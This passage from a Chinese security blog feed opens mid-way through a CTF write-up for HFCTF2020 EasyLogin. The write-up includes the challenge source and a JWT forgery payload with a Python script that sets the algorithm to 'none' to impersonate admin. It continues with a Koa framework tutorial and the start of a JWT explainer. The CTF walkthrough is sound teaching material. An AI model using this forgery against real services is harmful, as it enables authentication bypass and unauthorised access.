class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<span class="hljs-built_in">module</span>.<span class="hljs-built_in">exports</span> = &#123;    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;            <span class="hljs-built_in">global</span>.secrets = [];        &#125;        <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);        <span class="hljs-keyword">const</span> secretid = <span class="hljs-built_in">global</span>.secrets.length;        <span class="hljs-built_in">global</span>.secrets.push(secret)        <span class="hljs-keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);        ctx.rest(&#123;            token: token        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;        <span class="hljs-keyword">if</span>(!username || !password) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        <span class="hljs-keyword">const</span> sid = <span class="hljs-built_in">JSON</span>.parse(Buffer.<span class="hljs-keyword">from</span>(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;        <span class="hljs-built_in">console</span>.log(sid)        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> secret = <span class="hljs-built_in">global</span>.secrets[sid];        <span class="hljs-keyword">const</span> user = jwt.verify(token, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);        <span class="hljs-keyword">const</span> status = username === user.username &amp;&amp; password === user.password;        <span class="hljs-keyword">if</span>(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();        ctx.rest(&#123;            flag        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        ctx.session.username = <span class="hljs-literal">null</span>;        ctx.rest(&#123;            status: <span class="hljs-literal">true</span>        &#125;)        <span class="hljs-keyword">await</span> next();    &#125;&#125;;</code></pre><p>其中</p><pre><code class="hljs reasonml">&#x27;GET /api/flag&#x27;: async<span class="hljs-function"> (<span class="hljs-params">ctx</span>, <span class="hljs-params">next</span>) =&gt;</span> &#123;       <span class="hljs-keyword">if</span>(ctx.session.username !== &#x27;admin&#x27;)&#123;           throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">APIError(&#x27;<span class="hljs-params">permission</span> <span class="hljs-params">error</span>&#x27;, &#x27;<span class="hljs-params">permission</span> <span class="hljs-params">denied</span>&#x27;)</span>;       &#125;       const flag = fs.read<span class="hljs-constructor">FileSync(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">flag</span>&#x27;)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;       ctx.rest(&#123;           flag       &#125;);       await next<span class="hljs-literal">()</span>;   &#125;,</code></pre><p>可知<code>admin</code>才能拿到flag, 但注册的时候，用户名不能为admin，会生成jwt令牌, 登录的时候，校验相应的jwt令牌</p><p>登录时进行抓包</p><p><img src="/2021/07/20/jwt/1.jpg" alt="1"></p><p>响应消息中，有两个值 ,访问flag时会用这两个值去验证</p><p><img src="/2021/07/20/jwt/2.jpg" alt="2"></p><p>不是admin用户,报错, 此时可用<code>jwt伪造</code>伪装成<code>admin</code>拿flag;源码中规定了jwt内容:</p><pre><code class="hljs pgsql">const token = jwt.sign(&#123;secretid, username, <span class="hljs-keyword">password</span>&#125;, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);</code></pre><p>如上,我们可以在https://jwt.io/解析jwt</p><p><img src="/2021/07/20/jwt/3.jpg" alt="3"></p><p>直接运用 将加密方式改为none的方式，payload:</p><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;none&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>&#125;.&#123;  <span class="hljs-string">&quot;secretid&quot;</span>:[],  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1587632063</span>  &#125;</code></pre><p>编码后在登录时抓包替换authorization值</p><p><img src="/2021/07/20/jwt/4.jpg" alt="4"></p><p>访问flag时再替换上述两个值<code>sses.aok</code>,<code>sses.sok.sig</code></p><p><img src="/2021/07/20/jwt/5.jpg" alt="5"></p><p>编码可在网站也可用脚本</p><p>编码脚本:</p><pre><code class="hljs routeros">import jwtpayload = &#123;    <span class="hljs-string">&quot;secretid&quot;</span>: 0.1,    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,    <span class="hljs-string">&quot;iat&quot;</span>: 1587287370&#125;myToken = jwt.encode(payload, <span class="hljs-attribute">algorithm</span>=<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-attribute">key</span>=<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-builtin-name">print</span>(myToken)</code></pre><p>参考:</p><p><a href="https://blog.csdn.net/K1ose/article/details/115189727">[HFCTF2020]EasyLogin</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>koa框架浅析</title>
    <link href="/2021/07/19/koa/"/>
    <url>/2021/07/19/koa/</url>
    
    <content type="html"><![CDATA[<h2 id="koa框架"><a class="header-anchor" href="#koa框架">🍭</a>koa框架</h2><p>Koa 是一个新的 web 框架， 通过利用 async 函数，Koa 丢弃了回调函数，增强错误处理，没有捆绑任何中间件。</p><h3 id="目录结构"><a class="header-anchor" href="#目录结构">🍭</a>目录结构</h3><img src="/2021/07/19/koa/1.png" alt="1" style="zoom:50%;"><h4 id="app-js"><a class="header-anchor" href="#app-js">🍭</a>app.js</h4><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> Koa = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>)<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-bodyparser&#x27;</span>)()<span class="hljs-keyword">const</span> staticCache = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-static-cache&#x27;</span>)<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./config&#x27;</span>)<span class="hljs-keyword">const</span> publicRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/public&#x27;</span>)<span class="hljs-keyword">const</span> privateRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/private&#x27;</span>)<span class="hljs-keyword">const</span> &#123; loggerMiddleware &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./middlewares/logger&#x27;</span>)<span class="hljs-keyword">const</span> &#123; errorHandler, responseHandler &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./middlewares/response&#x27;</span>)<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> Koa()<span class="hljs-comment">// Logger</span>app.use(loggerMiddleware)<span class="hljs-comment">// Error Handler</span>app.use(errorHandler)<span class="hljs-comment">// Global Middlewares</span>app.use(bodyParser)app.use(staticCache(config.publicDir))<span class="hljs-comment">// Routes</span>app.use(publicRouter.routes(), publicRouter.allowedMethods())app.use(privateRouter.routes(), privateRouter.allowedMethods())<span class="hljs-comment">// Response</span>app.use(responseHandler)<span class="hljs-built_in">module</span>.exports = app</code></pre><p>文件有较多的中间件，中间件的执行顺序是从外到内，再从内到外，也就是洋葱模式。中间件的执行过程是依靠<code>app.use()</code>进行传递的，可以简单的理解为自己编写的函数，依次去执行即可。每一个中间件会在app调用是传入2个参数，分别为： <code>ctx</code>和<code>next</code></p><blockquote><p>ctx:<br>Koa Context 将 node 的 request 和 response 对象封装在一个单独的对象里面，其为编写 web 应用和 API 提供了很多有用的方法。<br>这些操作在HTTP服务器开发中经常使用，因此其被添加在上下文这一层，而不是更高层框架中，因此将迫使中间件需要重新实现这些常用方法。</p><p>next：<br>下一个中间件函数，也就是每一个中间件如果要往下走必须写上这个，否则无法执行。<br>可以理解为前端的vue-Router中的路由守卫中的next(), 执行下一步或者进行传参。</p></blockquote><h4 id="middlewares文件"><a class="header-anchor" href="#middlewares文件">🍭</a>middlewares文件</h4><p>在这个项目主要用到了几个中间件:<code>logger.js</code>,<code>response.js</code>, <code>jwt.js</code>等其他中间件。若在此目录中新建对应中间件后，要在app.js中进行引入，否在无法生效。中间件的执行很像一个洋葱，但并不是一层一层的执行，而是以next为分界，先执行本层中next以前的部分，当下一层中间件执行完后，再执行本层next以后的部分。</p><p><img src="/2021/07/19/koa/2.png" alt="2"></p><h5 id="logger-js"><a class="header-anchor" href="#logger-js">🍭</a>logger.js</h5><p>这个中间件会在控制台或者日志中打印出固定的格式，http请求方法、返回状态、请求url、IP地址、请求时间等，而且我们也可以很好的利用log4js中的配置，来打印出自定义的日志。可以代替<code>console.log()</code>使用,在使用这个中间件的时候，必须放在第一个中间件，才能保证所以的请求及操作会先经过logger进行记录再到下一个中间件.</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<span class="hljs-keyword">const</span> log4js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;log4js&#x27;</span>)<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../config&#x27;</span>)<span class="hljs-comment">// 这个是判断是否有logs目录，没有就新建，用来存放日志</span><span class="hljs-keyword">const</span> logsDir = path.parse(config.logPath).dir<span class="hljs-keyword">if</span> (!fs.existsSync(logsDir)) &#123;  fs.mkdirSync(logsDir)&#125;<span class="hljs-comment">// 配置log4.js</span>log4js.configure(&#123;  appenders: &#123;    <span class="hljs-built_in">console</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;console&#x27;</span> &#125;,    dateFile: &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;dateFile&#x27;</span>, <span class="hljs-attr">filename</span>: config.logPath, <span class="hljs-attr">pattern</span>: <span class="hljs-string">&#x27;-yyyy-MM-dd&#x27;</span> &#125;  &#125;,  categories: &#123;    <span class="hljs-keyword">default</span>: &#123;      appenders: [<span class="hljs-string">&#x27;console&#x27;</span>, <span class="hljs-string">&#x27;dateFile&#x27;</span>],      level: <span class="hljs-string">&#x27;info&#x27;</span>    &#125;  &#125;&#125;)<span class="hljs-keyword">const</span> logger = log4js.getLogger(<span class="hljs-string">&#x27;[Default]&#x27;</span>)<span class="hljs-comment">// logger中间件</span><span class="hljs-keyword">const</span> loggerMiddleware = <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<span class="hljs-comment">// 请求开始时间</span>  <span class="hljs-keyword">const</span> start = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()  <span class="hljs-keyword">await</span> next()  <span class="hljs-comment">// 结束时间</span>  <span class="hljs-keyword">const</span> ms = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>() - start    <span class="hljs-comment">// 打印出请求相关参数</span>  <span class="hljs-keyword">const</span> remoteAddress = ctx.headers[<span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>] || ctx.ip || ctx.ips ||    (ctx.socket &amp;&amp; (ctx.socket.remoteAddress || (ctx.socket.socket &amp;&amp; ctx.socket.socket.remoteAddress)))  <span class="hljs-keyword">let</span> logText = <span class="hljs-string">`<span class="hljs-subst">$&#123;ctx.method&#125;</span> <span class="hljs-subst">$&#123;ctx.status&#125;</span> <span class="hljs-subst">$&#123;ctx.url&#125;</span> 请求参数： <span class="hljs-subst">$&#123;<span class="hljs-built_in">JSON</span>.stringify(ctx.request.body)&#125;</span> 响应参数： <span class="hljs-subst">$&#123;<span class="hljs-built_in">JSON</span>.stringify(ctx.body)&#125;</span> - <span class="hljs-subst">$&#123;remoteAddress&#125;</span> - <span class="hljs-subst">$&#123;ms&#125;</span>ms`</span>  logger.info(logText)&#125;<span class="hljs-built_in">module</span>.exports = &#123;  logger,  loggerMiddleware&#125;</code></pre><h5 id="response-js"><a class="header-anchor" href="#response-js">🍭</a>response.js</h5><p>这个中间件主要是用来对返回前端的响应进行处理，基础的koa模板中，我们可以用 <code>ctx.body</code>进行返回前端，但是有些东西经常重复写，进行封装较方便。</p><h5 id="cors-js"><a class="header-anchor" href="#cors-js">🍭</a>cors.js</h5><p>在前后端接口请求中，由于浏览器的限制，会出现跨域的情况。常用的跨域方案有：</p><ul><li>JSONP跨域</li><li>nginx反向代理</li><li>服务器端修改heade</li><li>document.domain</li><li><a href="http://window.name">window.name</a></li><li>postMessage</li><li>后台配置运行跨域</li></ul><p>cors具体实现跨域</p><pre><code class="hljs awk">app.use(async (ctx, <span class="hljs-keyword">next</span>) =&gt; &#123;    <span class="hljs-regexp">//</span> 允许来自所有域名请求    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>);    <span class="hljs-regexp">//</span> 这样就能只允许 http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span> 这个域名的请求了    <span class="hljs-regexp">//</span> ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;http://localhost:8080&quot;</span>);     <span class="hljs-regexp">//</span> 设置所允许的HTTP请求方法    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="hljs-string">&quot;OPTIONS, GET, PUT, POST, DELETE&quot;</span>);    <span class="hljs-regexp">//</span> 字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段.    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="hljs-string">&quot;x-requested-with, accept, origin, content-type&quot;</span>);    <span class="hljs-regexp">//</span> 服务器收到请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。    <span class="hljs-regexp">//</span> Content-Type表示具体请求中的媒体类型信息    ctx.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);    <span class="hljs-regexp">//</span> 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。    <span class="hljs-regexp">//</span> 当设置成允许请求携带cookie时，需要保证<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>是服务器有的域名，而不能是<span class="hljs-string">&quot;*&quot;</span>;    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, true);    <span class="hljs-regexp">//</span> 该字段可选，用来指定本次预检请求的有效期，单位为秒。    <span class="hljs-regexp">//</span> 当请求方法是PUT或DELETE等特殊方法或者Content-Type字段的类型是application/json时，服务器会提前发送一次请求进行验证    <span class="hljs-regexp">//</span> 下面的的设置只本次验证的有效时间，即在该时间段内服务端可以不用进行验证    ctx.set(<span class="hljs-string">&quot;Access-Control-Max-Age&quot;</span>, <span class="hljs-number">300</span>);    /*    CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到<span class="hljs-number">6</span>个基本字段：        Cache-Control、        Content-Language、        Content-Type、        Expires、        Last-Modified、        Pragma。    */    <span class="hljs-regexp">//</span> 需要获取其他字段时，使用Access-Control-Expose-Headers，    <span class="hljs-regexp">//</span> getResponseHeader(<span class="hljs-string">&#x27;myData&#x27;</span>)可以返回我们所需的值    <span class="hljs-regexp">//</span>https:<span class="hljs-regexp">//</span>www.rails365.net<span class="hljs-regexp">/articles/</span>cors-jin-jie-expose-headers-wu    ctx.set(<span class="hljs-string">&quot;Access-Control-Expose-Headers&quot;</span>, <span class="hljs-string">&quot;myData&quot;</span>);        await <span class="hljs-keyword">next</span>();&#125;)</code></pre><h5 id="koa-helmet-中间件"><a class="header-anchor" href="#koa-helmet-中间件">🍭</a>koa-helmet 中间件</h5><p>koa-helmet 可以帮助 app 抵御一些比较常见的安全 web 安全隐患，它将 9 个安全中间件集中到了一起，做了合并,大部分都是对于 http header 的操作。默认开启功能：</p><p><img src="/2021/07/19/koa/5.png" alt="5"></p><p>安装后需在app.js进行引用：</p><pre><code class="hljs isbl"><span class="hljs-variable">const</span> <span class="hljs-variable">helmet</span> = <span class="hljs-function"><span class="hljs-title">require</span>(<span class="hljs-string">&quot;koa-helmet&quot;</span>)</span><span class="hljs-comment">// Helmet</span><span class="hljs-variable">app.use</span>(<span class="hljs-function"><span class="hljs-title">helmet</span>())</span></code></pre><h5 id="路由配置"><a class="header-anchor" href="#路由配置">🍭</a>路由配置</h5><ul><li><code>private.js</code>：该文件下的路由是需要通过jwt验证的，才能进行访问。</li><li><code>public.js</code>：该文件与上面相反，主要用来不进行登录的校验，也就是我们常用的登录、注册等不需要验证的接口。</li></ul><h5 id="controllers文件"><a class="header-anchor" href="#controllers文件">🍭</a>controllers文件</h5><p>为了让整个项目更为模块化，该目录下主要是处理对应的路由的回调函数，一般我们不会在router文件中去业务逻辑操作等步骤，这里采用 routes 和 controller 分开，在方便代码的查看同时，也方便代码的维护和开发。</p><p>controller下的index.js文件将其他文件导出统一到index暴露出去：</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> files = fs.readdirSync(__dirname).filter(<span class="hljs-function"><span class="hljs-params">file</span> =&gt;</span> file !== <span class="hljs-string">&#x27;index.js&#x27;</span>)<span class="hljs-keyword">const</span> controllers = &#123;&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> file <span class="hljs-keyword">of</span> files) &#123;  <span class="hljs-keyword">if</span> (file.toLowerCase().endsWith(<span class="hljs-string">&#x27;js&#x27;</span>)) &#123;    <span class="hljs-keyword">const</span> controller = <span class="hljs-built_in">require</span>(<span class="hljs-string">`./<span class="hljs-subst">$&#123;file&#125;</span>`</span>)    controllers[<span class="hljs-string">`<span class="hljs-subst">$&#123;file.replace(<span class="hljs-regexp">/\.js/</span>, <span class="hljs-string">&#x27;&#x27;</span>)&#125;</span>`</span>] = controller  &#125;&#125;<span class="hljs-built_in">module</span>.exports = controllers</code></pre><p>controller下的user.js文件是我们处理业务的，可按需添加</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../config&#x27;</span>)<span class="hljs-keyword">const</span> userServices = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../services&#x27;</span>).user<span class="hljs-keyword">const</span> &#123; InvalidQueryError &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../lib/error&#x27;</span>)<span class="hljs-keyword">const</span> login = &#123;&#125;login.login = <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;    <span class="hljs-built_in">console</span>.log(userServices)    <span class="hljs-keyword">const</span> &#123;userName, password&#125; = ctx.request.body    <span class="hljs-keyword">if</span> (!userName || !password) &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidQueryError()    &#125;    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> userServices.login(&#123;        userName: userName,        password: password    &#125;)    <span class="hljs-keyword">if</span> (!user) &#123;        ctx.result = <span class="hljs-string">&#x27;&#x27;</span>        ctx.msg = <span class="hljs-string">&#x27;用户不存在&#x27;</span>    &#125; <span class="hljs-keyword">else</span> &#123;        ctx.result = jwt.sign(&#123;            data: user._id,            <span class="hljs-comment">// 设置 token 过期时间</span>            exp: <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Date</span>.now() / <span class="hljs-number">1000</span>) + (<span class="hljs-number">60</span> * <span class="hljs-number">60</span>), <span class="hljs-comment">// 60 seconds * 60 minutes = 1 hour</span>        &#125;, config.secret)    &#125;    <span class="hljs-keyword">return</span> next()&#125;<span class="hljs-built_in">module</span>.exports = login</code></pre><h4 id="models文件"><a class="header-anchor" href="#models文件">🍭</a>models文件</h4><p>该项目中是使用<code>mongoose</code>对<code>mongoDB</code>对数据库进行操作,<code>mongoose</code>的配置包括三大部分：<code>connect</code>、<code>Models</code>和<code>Schema</code></p><p><code>connect</code>：用于创建数据库连接及监听</p><p><code>Schema</code>：Schema主要用于定义MongoDB中集合Collection里文档document的结构,可以理解为mongoose对表结构的定义(不仅仅可以定义文档的结构和属性，还可以定义文档的实例方法、静态模型方法、复合索引等)，每个schema会映射到mongodb中的一个collection，schema不具备操作数据库的能力，简单理解是对字段的定义，操作数据库必须按照这些字段进行，否在会报错。</p><p><code>Models</code>： 　Model是由Schema编译而成的假想（fancy）构造器，具有抽象属性和行为。Model的每一个实例（instance）就是一个document，document可以保存到数据库和对数据库进行操作。简单说就是model是由schema生成的模型，可以对数据库的操作。</p><h4 id="package-json文件"><a class="header-anchor" href="#package-json文件">🍭</a>package.json文件</h4><p>每个Nodejs项目的根目录下面，一般都会有一个package.json文件。该文件可以由npm init生成，定义了项目所需要的各种模块，以及项目的配置信息（比如名称、版本、许可证等元数据)。 package.json文件内部就是一个JSON对象，该对象的每一个成员就是当前项目的一项设置。我们也可在里面配置我们的<code>npm run XXX</code>的命令。</p><p>本项目的package.json：</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;koa-template&quot;</span>,  <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.1.0&quot;</span>,  <span class="hljs-attr">&quot;author&quot;</span>: <span class="hljs-string">&quot;bayi&quot;</span>,  <span class="hljs-attr">&quot;private&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;scripts&quot;</span>: &#123;    <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;node ./bin/www&quot;</span>,    <span class="hljs-attr">&quot;dev&quot;</span>: <span class="hljs-string">&quot;pm2 start ecosystem.config.js --env dev&quot;</span>,    <span class="hljs-attr">&quot;test&quot;</span>: <span class="hljs-string">&quot;pm2 start ecosystem.config.js --env test&quot;</span>,    <span class="hljs-attr">&quot;pro&quot;</span>: <span class="hljs-string">&quot;pm2 start ecosystem.config.js --env pro&quot;</span>,    <span class="hljs-attr">&quot;logs&quot;</span>: <span class="hljs-string">&quot;pm2 logs&quot;</span>,    <span class="hljs-attr">&quot;stop&quot;</span>: <span class="hljs-string">&quot;pm2 stop ecosystem.config.js&quot;</span>  &#125;,  <span class="hljs-attr">&quot;dependencies&quot;</span>: &#123;    <span class="hljs-attr">&quot;koa&quot;</span>: <span class="hljs-string">&quot;^2.6.2&quot;</span>,    <span class="hljs-attr">&quot;koa-bodyparser&quot;</span>: <span class="hljs-string">&quot;^4.2.1&quot;</span>,    <span class="hljs-attr">&quot;koa-helmet&quot;</span>: <span class="hljs-string">&quot;^4.1.0&quot;</span>,    <span class="hljs-attr">&quot;koa-jwt&quot;</span>: <span class="hljs-string">&quot;^3.5.1&quot;</span>,    <span class="hljs-attr">&quot;koa-router&quot;</span>: <span class="hljs-string">&quot;^7.4.0&quot;</span>,    <span class="hljs-attr">&quot;koa-static-cache&quot;</span>: <span class="hljs-string">&quot;^5.1.2&quot;</span>,    <span class="hljs-attr">&quot;koa2-cors&quot;</span>: <span class="hljs-string">&quot;^2.0.6&quot;</span>,    <span class="hljs-attr">&quot;log4js&quot;</span>: <span class="hljs-string">&quot;^3.0.6&quot;</span>,    <span class="hljs-attr">&quot;mongoose&quot;</span>: <span class="hljs-string">&quot;^5.5.5&quot;</span>  &#125;&#125;</code></pre><h4 id="config-js文件"><a class="header-anchor" href="#config-js文件">🍭</a>config.js文件</h4><p>根目录新建该文件主要用来存放全局的配置，如果一个项目中没有全局的配置，那么一个地方改动牵动的其他地方很多，这样工作效率很低，我们一般会把常用的都放在这个文件，例如：数据库参数，端口，密钥，全局变量等。</p><h4 id="services文件"><a class="header-anchor" href="#services文件">🍭</a>services文件</h4><p>这个文件主要是用来处理数据库以及服务等逻辑，该文件夹下index.js文件内容与controllers文件中的用法一致。</p><h4 id="PM2配置"><a class="header-anchor" href="#PM2配置">🍭</a>PM2配置</h4><p>PM2是可以用于生产环境的Nodejs的进程管理工具，并且它内置一个负载均衡。它可以保证服务不会中断一直在线，并且提供0秒reload功能，还有其他一系列进程管理、监控功能。</p><h4 id="lib文件"><a class="header-anchor" href="#lib文件">🍭</a>lib文件</h4><ul><li><code>error.js</code>：主要是在中间件中抛出异常，由于前面我们已经加入了异常捕获的中间件，在中间件操作过程中，如果有错误，我们可以直接抛出异常，这个方法就是为了方便我们配置所用的。</li><li><code>mongoDB.js</code>：对mongoDB的链接配置。</li></ul><h4 id="bin文件"><a class="header-anchor" href="#bin文件">🍭</a>bin文件</h4><p>该文件是用来部署的时候可以启动我们一整个后端程序，也就是前端中的集成的运行环境。我们的运行、关闭、重启都在这文件进行即可。</p><p>参考：</p><p><a href="https://www.jianshu.com/p/47259f48c153">https://www.jianshu.com/p/47259f48c153</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JSON Web Token</title>
    <link href="/2021/07/19/11/"/>
    <url>/2021/07/19/11/</url>
    
    <content type="html"><![CDATA[<p>JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案，用于作为JSON对象在各方之间安全地传输信息。</p><h3 id="跨域认证"><a class="header-anchor" href="#跨域认证">🍭</a>跨域认证</h3><p>用户认证流程(之前CSRF就讲过了)</p><blockquote><p>1、用户向服务器发送用户名和密码。</p><p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p><p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p><p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</p><p>5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</p></blockquote><p>如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</p><h3 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h3><p>服务器认证以后，生成一个 JSON 对象(JSONP注入里讲过)，发回给用户, 如下:</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;姓名&quot;</span>: <span class="hljs-string">&quot;wenwen&quot;</span>,  <span class="hljs-attr">&quot;角色&quot;</span>: <span class="hljs-string">&quot;管理员&quot;</span>,  <span class="hljs-attr">&quot;到期时间&quot;</span>: <span class="hljs-string">&quot;2100年9月16日0点0分&quot;</span>&#125;</code></pre><p>用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名，JWT通常放在Authorization header中，用Bearer schema。</p><pre><code class="hljs dts"><span class="hljs-symbol">Authorization:</span> Bearer <span class="hljs-params">&lt;token&gt;</span></code></pre><p>流程：</p><p><img src="/2021/07/19/11/1.jpg" alt="1"></p><h3 id="结构"><a class="header-anchor" 